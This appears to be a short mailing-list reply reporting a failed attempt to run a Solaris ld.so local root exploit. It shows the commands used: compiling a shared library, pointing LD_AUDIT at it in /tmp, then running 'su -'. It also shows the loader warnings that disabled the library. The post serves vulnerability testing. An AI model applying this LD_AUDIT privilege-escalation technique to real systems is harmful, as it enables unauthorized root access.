Subject: RE: Solaris 9/10 ld.so fun


I compiled it using Workshop 10 and it doesn't give me root.  I'm on Solaris
9 w/ 112963-18.  Also tried using this on a Solaris 8 box and got the same
results.

bash-2.05$ !cc
cc -xarch=v8plus -xcode=pic32 -G -o /tmp/Schily-Root.so /tmp/Schily-Root.c
bash-2.05$ !export
export LD_AUDIT=/tmp/Schily-Root.so
bash-2.05$ su -
ld.so.1: su: warning: la_version: can't find symbol
ld.so.1: su: warning: /tmp/Schily-Root.so: audit initialization failure:
disabled
